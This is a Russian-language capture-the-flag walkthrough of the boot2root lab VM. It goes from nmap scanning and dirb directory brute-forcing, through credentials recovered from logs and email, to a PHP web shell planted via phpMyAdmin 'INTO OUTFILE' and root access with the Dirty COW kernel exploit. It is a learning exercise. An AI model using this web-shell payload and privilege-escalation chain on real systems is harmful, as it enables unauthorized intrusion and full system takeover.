## Поиск IP адреса нашей виртуальной машины на пк.

``
ifconfig - для поиска нужного IP адреса на пк. 
``

![
vmnet8: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	ether 00:50:56:c0:00:08
	inet 172.16.101.1 netmask 0xffffff00 broadcast 172.16.101.255
](/imgs/img1.png)

## Прогонка портов через nmap для получения сведений о нужном нам адресе.

``
nmap 172.16.101.1-255
``

![
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 172.16.101.128
Host is up (0.0012s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 255 IP addresses (2 hosts up) scanned in 27.37 seconds
](/imgs/img2.png)
``172.16.101.128 нужный нам IP`` 

## Проверка всех ссылок по адресу.
``git clone https://github.com/v0re/dirb.git``
### Установка dirb
```
cd dirb
./confgiure
make
```
``./dirb https://172.16.101.128/ wordlists/common.txt``
## Проверка ссылок на форуме.
После того как зашли на форум, находим ответвление 'Probleme login ?'.
Пройдясь по логам находим две строки:

### Первый ввод предположительно были перепутаны строки для логина и пароля.
![
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
](/imgs/img3.png)

### Во втором ввод логина был правильный.
![
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard 
](/imgs/img4.png)

## Попытка войти на почту с полученным логином и паролем.
Переходим по ссылке ``https://172.16.101.128/webmail/src/login.php``
При воде пароля ``lmezard`` и пароля ``!q\]Ej?*5K5cy*AJ`` не срабатывает.
Делаем поиск ника ``lmezard`` в гугле :
![
Google info about lmezard. Laurie Mezard
](/imgs/img5.png)
Нам выдало полное имя Laurie Mezard. Пробуем разные варианты для логина.
Нужный нам вариант ``laurie@borntosec.net``.
Входим на мейл ``login: laurie@borntosec.net`` и ``password: !q\]Ej?*5K5cy*AJ``
Полазив по почте находим письмо:
![
Hey Laurie,
You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
Best regards.
](/imgs/img6.png)
Находим пароль и логин для базы данных ``login: root`` и ``password: Fg-'kKXBj87E:aJ$``
## Попытка входа в phpmyadmin.
Переходим по ссылке ``https://172.16.101.128/phpmyadmin/``
С логином и паролем входим в бд.
После поиском по сети находим експлойт для дб.
``select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output ?>" into outfile "/var/www/forum/templates_c/pokemon.php"``
Переходим на sqltab в том же окне phpmyadmin в который мы залогинились.
Выполняем скрипт.
Скриптом создали новый темплейт по ссылке ``https://172.16.101.128/forum/templates_c/pokemon.php`` где находим ``lmezard:G!@M6f4Eatau{sF"``.

## Попытка входа по ftp.
Теперь пробуем подключиться по ftp.
``ftp 172.16.101.128``
``login: lmezard``
``password: G!@M6f4Eatau{sF"``
Вход успешен, смотрим что там находится:
![
README.md
fun
](/imgs/img7.png)
Теперь скидываем файл себе ``get fun ~/boot2root/fun``
В файле куча разной информации, если посмотреть тип файла ``file fun`` узнаем что это архив.
Разархивируем архив ``tar xvf fun``
Получаем целую папку с разными файлами. При просмотре каждого файла пузнаем что
там есть строка с номерным знаком и кусок сишного кода. 
Используем небольшой самописный скрипт который соберет все из файлов, отсортирует и потом создаст новый файл main.c .
``python unpack.py``
``gcc main.c``
``./a.out``
 После запуска получаем :
 ![
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
](/imgs/img8.png)
Шифруем его в SHA-256 и получаем :
``330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4``

## Попытка входа по ssh.
``ssh laurie@172.16.101.128``
``login: laurie``
``password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4``
Мы вошли по SSH на сервер.
Теперь нужно узнать что это за сервер что бы правильно нагуглить експлойт для рута.
``uname -r`` -> 3.2.0-91-generic-pae
``cat /etc/*-release`` -> DISTRIB_DESCRIPTION="Ubuntu 12.04.5 LTS"
С полученными данными делаем поиск в гугле и находим вот эту [ссылку](https://www.exploit-db.com/exploits/40839).
Создаем этот скрипт на сервере, мы сделали это через vim.
``touch pokemon.c``
``vim pokemon.c`` -> ``CMD + C`` -> ``CMD + V``
``gcc -pthread pokemon.c -o dirty -lcrypt && ./dirty``
Теперь задаем какой то пароль.
``si firefart``
# Вы под рутом.



